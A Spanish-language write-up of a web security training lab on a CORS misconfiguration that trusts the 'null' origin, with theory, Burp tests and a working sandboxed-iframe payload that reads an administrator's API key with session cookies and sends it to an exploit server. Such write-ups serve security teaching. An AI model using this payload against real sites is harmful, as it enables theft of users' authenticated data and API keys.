# 2. CORS con Null Origin

## 🌐 CORS con origen null marcado como confiable

### 📄 Descripción del laboratorio

El laboratorio presenta una **configuración CORS insegura** que confía explícitamente en el origen **null**.

Además, el servidor incluye la cabecera:

```http
Access-Control-Allow-Credentials: true
```

Esto permite que peticiones **cross-origin autenticadas (con cookies)** sean aceptadas si el **Origin es null**, exponiendo datos sensibles como la **API key del administrador**.

El objetivo es:

* Ejecutar **JavaScript desde un origen null**.
* Robar la **API key del administrador**.
* Enviarla para resolver el laboratorio.

Credenciales de prueba:

* **wiener : peter**

***

### 📚 Teoría

El origen **null** se asigna a documentos cargados desde **contextos no jerárquicos**, por ejemplo:

* `data:` URLs
* `file://`
* `iframe` con **sandbox**
* `iframe` con **srcdoc**

#### 📌 Error común en CORS

Algunos servidores añaden **null** a la lista de orígenes permitidos para soportar casos especiales como **aplicaciones offline o contenido embebido**.

Cuando esto se combina con:

```
Access-Control-Allow-Credentials: true
```

se abre la puerta a un ataque completo.

#### 📌 Vector de ataque

Un atacante puede:

* Crear un **iframe sandboxed con `srcdoc`**.
* Ejecutar **JavaScript desde origen null**.
* Enviar **cookies de sesión** (`withCredentials = true`).
* Leer la **respuesta sensible del servidor**.

Este fallo es menos común que la reflexión arbitraria del **Origin**, pero puede tener el mismo impacto.

***

### 📝 Práctica

#### 🎯 Objetivo

Robar la **API key del administrador** ejecutando código desde un **origen null**.

***

#### 1️⃣ Análisis inicial

Se inicia sesión con **wiener:peter** y se accede a **My Account**.

Se observa que la petición:

```http
GET /accountDetails
```

devuelve **nuestra API key**.

La respuesta incluye la cabecera:

```http
Access-Control-Allow-Credentials: true
```

***

#### 2️⃣ Identificación del origen permitido

Se realizan pruebas manuales en **Burp Repeater**.

Primero se envía:

```http
Origin: https://test.com
```

Resultado: no es aceptado.

<figure><img src="../../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>

Después se prueba con:

```http
Origin: null
```

Resultado:

```http
Access-Control-Allow-Origin: null
```

<figure><img src="../../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>

Esto confirma que **solo el origen null está permitido**.

***

#### 3️⃣ Diseño del exploit

Un script ejecutado directamente en el **Exploit Server** tendría como origen el dominio del exploit, por lo que la petición sería bloqueada.

La solución consiste en ejecutar el JavaScript **dentro de un iframe sandboxed** y utilizar **srcdoc** para inyectar el código.

Un iframe con el atributo:

```javascript
sandbox="allow-scripts"
```

permite ejecutar JavaScript y asigna **origen null** al documento.

***

#### 4️⃣ Construcción del payload

Se crea el siguiente HTML en el **Exploit Server**:

{% code overflow="wrap" %}
```javascript
<iframe sandbox="allow-scripts" srcdoc="&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = 'https://TU-EXPLOIT-SERVER.exploit-server.net/?apikey=' + btoa(req.responseText);
    };
    req.open('GET', 'https://ID-DEL-LABORATORIO.web-security-academy.net/accountDetails');
    req.withCredentials = true;
    req.send();
&lt;/script&gt;"></iframe>
```
{% endcode %}

El atributo `sandbox="allow-scripts"` permite la ejecución de JavaScript, pero el documento resultante tiene **origen null**.

Este código:

* Ejecuta JavaScript desde **origen null**.
* Realiza una petición autenticada a `/accountDetails`.
* Codifica la respuesta en **Base64**.
* Envía el resultado a los **logs del Exploit Server**.

<figure><img src="../../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

#### 5️⃣ Ejecución del ataque

Se guarda el exploit pulsando **Store** y posteriormente se selecciona **Deliver exploit to victim**.

***

#### 6️⃣ Resultado final

Cuando el administrador carga la página maliciosa:

1. El **iframe** se ejecuta desde **origen null**.
2. El servidor acepta la petición **CORS**.
3. Se envían las **cookies de sesión** del administrador.
4. La respuesta que contiene la **API key** queda accesible.
5. El valor codificado en Base64 aparece en los **Access logs**.

<figure><img src="../../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

Se decodifica el parámetro `apikey` y se obtiene la **API key del administrador**.

<figure><img src="../../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>

Finalmente, se introduce la clave en el laboratorio para marcarlo como resuelto.
